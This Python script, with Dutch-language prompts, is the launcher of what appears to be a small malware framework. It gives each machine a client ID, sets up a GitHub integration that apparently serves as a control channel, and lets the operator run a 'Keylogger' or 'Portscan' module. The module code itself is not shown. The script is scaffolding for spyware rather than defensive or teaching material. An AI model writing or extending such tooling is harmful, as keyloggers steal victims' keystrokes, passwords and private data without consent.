import json
import uuid
import importlib
import random
import time
from github_integration import GithubIntegration

def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

def save_config(config):
    with open('config.json', 'w') as f:
        json.dump(config, f, indent=4)

def main():
    config = load_config()

    # Check and generate unique client ID if not present
    if not config['client_id']:
        config['client_id'] = str(uuid.uuid4())
        save_config(config)

    github = GithubIntegration(config['client_id'])

    # Prompt user to select a module
    print("Kies een module om uit te voeren:")
    print("1. Keylogger")
    print("2. Portscan")
    choice = input("Voer het nummer van je keuze in: ")

    if choice == '1':
        module_name = 'keylogger_module'
    elif choice == '2':
        module_name = 'portscan_module'
    else:
        print("Ongeldige keuze, probeer het opnieuw.")
        return

    module = importlib.import_module(f"modules.{module_name}")
    module.run()

if __name__ == "__main__":
    main()
